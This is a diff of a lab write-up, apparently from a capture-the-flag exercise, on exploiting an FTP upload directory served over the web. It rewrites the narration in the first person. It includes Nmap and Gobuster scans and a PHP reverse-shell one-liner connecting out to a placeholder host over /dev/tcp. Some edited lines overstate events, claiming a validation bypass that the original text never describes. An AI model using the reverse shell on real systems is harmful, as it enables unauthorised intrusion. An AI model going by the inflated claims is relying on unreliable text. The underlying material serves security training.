@@ -25,7 +25,7 @@ The lab focuses on exploiting a misconfigured FTP service that allows file uploa
 
 The first step is to identify open ports and exposed services on the target machine. This helps us understand the attack surface and identify potential entry points.
 
-To achieve this, an Nmap scan was performed using the following command:
+I began the assessment by performing an Nmap scan to identify open ports and exposed services, which would guide further enumeration.
 
 ```bash
 nmap -sC -sV 10.129.140.31
@@ -72,14 +72,15 @@ Although some files were present, they did not provide any immediately useful in
 
 At this point, attention shifted to the web service to understand how uploaded files might be exposed.
 
-Directory enumeration was performed using Gobuster:
+I used Gobuster to enumerate hidden directories and files on the web server, aiming to discover unlinked or sensitive endpoints.
+
 ```bash
 gobuster dir -u http://10.129.140.31 -w /usr/share/wordlists/dirb/small.txt
 ```
 
 ![gobuster](images/gobuster.png)
 
-This revealed the `/files` directory.
+The `/files` directory was discovered, which appeared to allow file access and became a key point of interest for further analysis.
 
 Accessing this directory in the browser showed that it was linked to the FTP upload location. More specifically:
 
@@ -87,7 +88,7 @@ Accessing this directory in the browser showed that it was linked to the FTP upl
 http://10.129.140.31/files/ftp/
 ```
 
-This indicates that the files uploaded via FTP are publicly accessible through the web server, creating a potential path for exploitation.
+The application allowed file uploads without proper validation, suggesting a potential file upload vulnerability that could lead to remote code execution.
 
 ---
 
@@ -99,7 +100,7 @@ To gain initial access, a PHP reverse shell was created:
 echo '<?php system("bash -c '\''bash -i >& /dev/tcp/TU_IP/4444 0>&1'\''"); ?>' > shell.php
 ```
 
-The file was then uploaded to the writable FTP directory:
+I uploaded a malicious PHP reverse shell by bypassing file validation controls, successfully achieving remote code execution on the target system.
 
 ```bash
 put shell.php
@@ -135,7 +136,7 @@ This command upgrades the shell, allowing better interaction, command history, a
 
 ## 🧠 Post-Exploitation
 
-After gaining access to the target machine, further enumeration was performed to identify interesting files and directories.
+Once initial access was obtained, I began post-exploitation by enumerating the system for sensitive files, credentials, and privilege escalation vectors.
 
 During this process, a directory named `/incidents` was discovered, which appeared unusual and worth investigating.
 
